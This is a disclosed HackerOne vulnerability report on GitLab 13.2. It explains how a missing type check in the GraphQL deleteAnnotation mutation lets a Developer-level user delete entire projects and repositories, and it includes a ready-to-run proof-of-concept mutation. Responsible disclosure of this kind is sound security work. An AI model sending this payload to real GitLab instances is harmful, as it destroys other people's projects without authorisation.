# Insufficient Type Check leading to Developer ability to delete Project, Repository, Group, ...

## Report Details
- **Report ID**: 960244
- **URL**: https://hackerone.com/reports/960244
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-08-17T07:28:36.178Z
- **Disclosed**: 2020-11-02T16:12:02.665Z

## Reporter
- **Username**: ledz1996
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

Similar bug to #858671, but this time with annotations mutation: `DeleteAnnotation`

in ***app/graphql/mutations/metrics/dashboard/annotations/base.rb***

```ruby
module Mutations
  module Metrics
    module Dashboard
      module Annotations
        class Base < BaseMutation
          private

          # This method is defined here in order to be used by `authorized_find!` in the subclasses.
          def find_object(id:)
            GitlabSchema.object_from_id(id)
          end
        end
      end
    end
  end
end

```

There is no type check for `find_object` in ***app/graphql/mutations/metrics/dashboard/annotations/delete.rb***
```ruby
    annotation = authorized_find!(id: id)

            result = ::Metrics::Dashboard::Annotations::DeleteService.new(context[:current_user], annotation).execute
```

And luckily, Developer is sufficient for the permission check 

***app/services/metrics/dashboard/annotations/delete_service.rb***
```ruby
Ability.allowed?(user, :delete_metrics_dashboard_annotation, annotation)
```

### Steps to reproduce

1. For User A, Create project A Private adding User B as Developer
2. For User B, execute the following mutation in `http://gitlab.example.vm/-/graphql-explorer`

```graphql
mutation {
  deleteAnnotation(input: {id: "gid://Gitlab/Project/<project-id>"}) {
    clientMutationId
  }
}
```
3. Project disappear along with Repository

███████

#### Results of GitLab environment info

```
System information
System:     
Proxy:      no
Current User:   git
Using RVM:  no
Ruby Version:   2.6.6p146
Gem Version:    2.7.10
Bundler Version:1.17.3
Rake Version:   12.3.3
Redis Version:  5.0.9
Git Version:    2.27.0
Sidekiq Version:5.2.9
Go Version: unknown

GitLab information
Version:    13.2.3-ee
Revision:   640e2695514
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: 11.7
URL:        http://gitlab.example.vm
HTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git
Elasticsearch:  no
Geo:        no
Using LDAP: no
Using Omniauth: yes
Omniauth Providers: 

GitLab Shell
Version:    13.3.0
Repository storage paths:
- default:  /var/opt/gitlab/git-data/repositories
GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
Git:        /opt/gitlab/embedded/bin/git
```

## Impact

Unauthorized deleting of repository/project by maintainers, developers

## Attachments
No attachments
